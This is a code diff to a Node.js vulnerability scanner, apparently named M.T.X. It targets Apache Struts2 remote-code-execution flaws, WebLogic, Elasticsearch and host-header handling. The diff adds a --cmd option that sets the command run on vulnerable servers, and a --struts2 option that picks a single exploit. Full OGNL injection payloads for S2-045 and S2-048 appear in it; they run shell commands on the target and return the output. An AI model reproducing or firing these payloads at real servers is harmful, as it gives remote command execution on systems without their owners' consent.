@@ -16,8 +16,42 @@ var szMyName = 'M.T.X._2017-06-08 1.0',
 	g_szUa = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
 	g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
 	g_szCmdW = "echo whoami: && whoami && echo pwd: && echo %cd% && echo cmdend", // && dir
-	aHS = "X-Content-Type-Options,content-type,Strict-Transport-Security,Public-Key-Pins,Content-Security-Policy,X-Permitted-Cross-Domain-Policies,Referrer-Policy,X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),
-	g_postData = "%{(#nike='multipart/form-data')"
+	aHS = "X-Content-Type-Options,content-type,Strict-Transport-Security,Public-Key-Pins,Content-Security-Policy,X-Permitted-Cross-Domain-Policies,Referrer-Policy,X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/)
+		;
+
+process.stdin.setEncoding('utf8');
+process.env.NODE_ENV = "production";
+process.on('uncaughtException', function(e){console.log(e)});
+process.on('unhandledRejection', function(e){console.log(e)});
+
+
+program.version(szMyName)
+	.option('-u, --url [value]', 'check url, no default')
+	.option('-p, --proxy [value]', 'http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default')
+	.option('-t, --t3', 'check weblogic t3,default false')
+	.option('-i, --install', 'install node modules,run: npm install')
+	.option('-v, --verbose', 'show logs')
+	.option('-S, --struts2 [value]', 'struts2 type,eg: 045')
+	.option('-C, --cmd [value]', 'cmd type,eg: "ping -c 3 www.baidu.com"')
+	.option('-o, --timeout', 'default ' + timeout)
+	.option('-l, --pool', 'default ' + g_nPool)
+	.option('-r, --test', 'test')
+	.option('-m, --menu [value]', 'scan url + menus, default ./urls/ta3menu.txt')
+	.option('-s, --webshell [value]', 'scan webshell url，设置参数才会运行, default ./urls/webshell.txt')
+	.option('-d, --method [value]', 'default PUT,DELETE,OPTIONS,HEAD,PATCH test')
+	.option('-a, --host ', 'host attack test,设置代理后该项功能可能无法使用,default true')
+	.option('-k, --keys [value]', 'scan html keywords, default ./urls/keywords')
+	.parse(process.argv);
+timeout = program.timeout || timeout;
+g_nPool = program.pool || g_nPool;
+
+if(program.cmd && "string" == typeof program.cmd)
+{
+	g_szCmdW = g_szCmd = program.cmd;
+}
+
+// 检查对象
+var a = process.argv.splice(2),g_postData = "%{(#nike='multipart/form-data')"
 		// s-045不允许下面的代码
 		// + ".(#_memberAccess['allowStaticMethodAccess']=true)"
 		// + ".(#_memberAccess['acceptProperties']=true)"
@@ -42,35 +76,7 @@ var szMyName = 'M.T.X._2017-06-08 1.0',
 	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
 		// + ".(@org.apache.commons.io.IOUtils@copy(new java.io.InputStreamReader(#process.getInputStream(),#iswin?'gbk':'UTF-8'),#ros))"
 		 + ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
-		+ ".(#ros.flush()).(#ros.close())}"
-		;
-
-process.stdin.setEncoding('utf8');
-process.env.NODE_ENV = "production";
-process.on('uncaughtException', function(e){console.log(e)});
-process.on('unhandledRejection', function(e){console.log(e)});
-
-
-program.version(szMyName)
-	.option('-u, --url [value]', 'check url, no default')
-	.option('-p, --proxy [value]', 'http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default')
-	.option('-t, --t3', 'check weblogic t3,default false')
-	.option('-i, --install', 'install node modules,run: npm install')
-	.option('-v, --verbose', 'show logs')
-	.option('-o, --timeout', 'default ' + timeout)
-	.option('-l, --pool', 'default ' + g_nPool)
-	.option('-r, --test', 'test')
-	.option('-m, --menu [value]', 'scan url + menus, default ./urls/ta3menu.txt')
-	.option('-s, --webshell [value]', 'scan webshell url，设置参数才会运行, default ./urls/webshell.txt')
-	.option('-d, --method [value]', 'default PUT,DELETE,OPTIONS,HEAD,PATCH test')
-	.option('-a, --host ', 'host attack test,设置代理后该项功能可能无法使用,default true')
-	.option('-k, --keys [value]', 'scan html keywords, default ./urls/keywords')
-	.parse(process.argv);
-timeout = program.timeout || timeout;
-g_nPool = program.pool || g_nPool;
-
-// 检查对象
-var a = process.argv.splice(2)
+		+ ".(#ros.flush()).(#ros.close())}";
 g_szUrl = program.url || 1 == a.length && a[0] || "";
 if(!/[\?;!&]|(\.jsp|do)/.test(g_szUrl) && '/' != g_szUrl.substr(-1))
 	g_szUrl += "/";
@@ -371,7 +377,7 @@ function doStruts2_033(url)
 function doStruts2_048(url,fnCbk)
 {
 	if('/' == url.substr(-1))url = url.substr(0,url.length - 1);
-	
+
 	var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
 		"(#_memberAccess?(#_memberAccess=#dm):" + 
 		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
@@ -478,6 +484,7 @@ function fnDoBody(body,t,rep)
 	}
 
 	var nwhoami = 0;
+	if(t && program.cmd && -1 == body.indexOf("<body"))console.log(t + "\n" + body);
 	if(!body || -1 == (nwhoami = body.indexOf("whoami")))return;
 	
 	//if(-1 < t.indexOf("s2-001"))console.log(body)
@@ -486,7 +493,10 @@ function fnDoBody(body,t,rep)
 	if(-1 < i)body = body.substr(0,i);
 	// if("s2-045" == t)console.log(body)
 	// 误报
-	if(-1 < body.indexOf("<body"))return;
+	if(-1 < body.indexOf("<body"))
+	{
+		return;
+	}
 	console.log("发现高危漏洞：" + t);
 	
 	if(0 < i) body = body.substr(0, i).trim().replace(/\u0000/gmi,'');
@@ -1446,38 +1456,48 @@ function fnMyPut(url)
 
 if(!program.test && 0 < a.length)
 {
-	//*
-	if(program.menu)fnCheckTa3(g_szUrl,program.menu || "./urls/ta3menu.txt","一些常见、可能存在风险url检测",'ta3menu');
-	if(program.webshell)fnCheckTa3(g_szUrl,program.webshell || "./urls/webshell.txt", "webshell、木马",'webshell');
-	testWeblogic(g_szUrl);
-	fnMyPut(g_szUrl);
-	doStruts2_001(g_szUrl);
-	doStruts2_005(g_szUrl);
-	doStruts2_007(g_szUrl);
-	doStruts2_008(g_szUrl);
-	doStruts2_009(g_szUrl);
-	doStruts2_012(g_szUrl);
-	doStruts2_013(g_szUrl);
-	doStruts2_015(g_szUrl);
-	doStruts2_016(g_szUrl);
-	doStruts2_019(g_szUrl);
-	// doStruts2_020(g_szUrl);
-	doStruts2_029(g_szUrl);
-	doStruts2_032(g_szUrl);
-	doStruts2_033(g_szUrl);
-	doStruts2_037(g_szUrl);
-	doStruts2_DevMode(g_szUrl);
-	doStruts2_045(g_szUrl);
-	// 文件上传测试
-	doStruts2_046(g_szUrl);
-	doStruts2_048(g_szUrl);
-	elasticsearch(g_szUrl);
-	
-	// fastjson(g_szUrl);
-	
-	// 测试method和伪造host
-	fnTestAll();
-	////////////////////*/
+	if(program.struts2)
+	{
+		if(/^\d\d\d$/g.test(program.struts2))
+		{
+			eval("doStruts2_" + program.struts2 + "(g_szUrl)");
+		}
+	}
+	else
+	{
+		//*
+		if(program.menu)fnCheckTa3(g_szUrl,program.menu || "./urls/ta3menu.txt","一些常见、可能存在风险url检测",'ta3menu');
+		if(program.webshell)fnCheckTa3(g_szUrl,"string" != typeof(program.webshell) && "./urls/webshell.txt" || program.webshell, "webshell、木马",'webshell');
+		testWeblogic(g_szUrl);
+		fnMyPut(g_szUrl);
+		doStruts2_001(g_szUrl);
+		doStruts2_005(g_szUrl);
+		doStruts2_007(g_szUrl);
+		doStruts2_008(g_szUrl);
+		doStruts2_009(g_szUrl);
+		doStruts2_012(g_szUrl);
+		doStruts2_013(g_szUrl);
+		doStruts2_015(g_szUrl);
+		doStruts2_016(g_szUrl);
+		doStruts2_019(g_szUrl);
+		// doStruts2_020(g_szUrl);
+		doStruts2_029(g_szUrl);
+		doStruts2_032(g_szUrl);
+		doStruts2_033(g_szUrl);
+		doStruts2_037(g_szUrl);
+		doStruts2_DevMode(g_szUrl);
+		doStruts2_045(g_szUrl);
+		// 文件上传测试
+		doStruts2_046(g_szUrl);
+		doStruts2_048(g_szUrl);
+		elasticsearch(g_szUrl);
+		
+		// fastjson(g_szUrl);
+		
+		// 测试method和伪造host
+		fnTestAll();
+		////////////////////*/
+	}
 }
 
 process.on('exit', (code) => 
